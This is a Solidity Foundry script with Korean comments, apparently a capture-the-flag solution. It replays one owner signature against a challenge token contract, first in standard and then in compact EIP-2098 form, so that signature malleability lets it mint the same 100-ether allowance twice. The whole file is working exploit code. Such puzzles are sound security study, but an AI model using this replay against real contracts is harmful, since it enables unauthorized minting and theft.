// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script,console} from "forge-std/Script.sol";
import {ECDSA} from "@openzeppelin/contracts/utils/cryptography/ECDSA.sol";

import {IForger} from "src/IForger.sol";

contract CounterScript is Script {

    // 문제 컨트랙트 주소
    IForger constant target = IForger(0x03269943d415Fe03e38f19443612cedc475948c4);
    
    // 주석으로 주어진 서명값들
    bytes constant signature = hex"f73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb1c";

    // 서명된 데이터들
    uint256 constant amount = 100 ether;
    address constant receiver = 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e;
    bytes32 constant salt = 0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d;
    uint256 constant deadline = 115792089237316195423570985008687907853269984665640564039457584007913129639935;

    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        (uint8 v, bytes32 r, bytes32 s) = ECDSA.parse(signature);

        // (r, s, v) 서명
        target.createNewTokensFromOwnerSignature(
            abi.encodePacked(r, s, v),
            receiver,
            amount,
            salt,
            deadline
        );

        // (r, vs) 서명
        target.createNewTokensFromOwnerSignature(
            abi.encodePacked(r, (uint256(v-0x1b) << 255) | uint256(s)),
            receiver,
            amount,
            salt,
            deadline
        );

        console.log("totalSupply:", target.totalSupply());

        vm.stopBroadcast();
    }
}
